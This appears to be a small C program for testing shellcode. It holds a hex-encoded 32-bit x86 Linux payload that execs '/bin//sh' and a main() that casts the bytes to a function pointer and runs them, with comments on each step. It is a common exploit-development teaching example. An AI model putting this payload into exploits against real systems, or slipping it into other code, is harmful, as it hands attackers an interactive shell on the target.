#include <stdio.h>
#include <string.h>

char shellcode[] = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80";
int main (int argc, char **argv)
{
        int (*ret)();              /* ret is a function pointer */
        ret = (int(*)())shellcode; /* ret points to our shellcode */
                                   /* shellcode is type casted as a function */
        (int)(*ret)();             /* execute as function shellcode[] */
        exit(0);                   /* exit() */
}
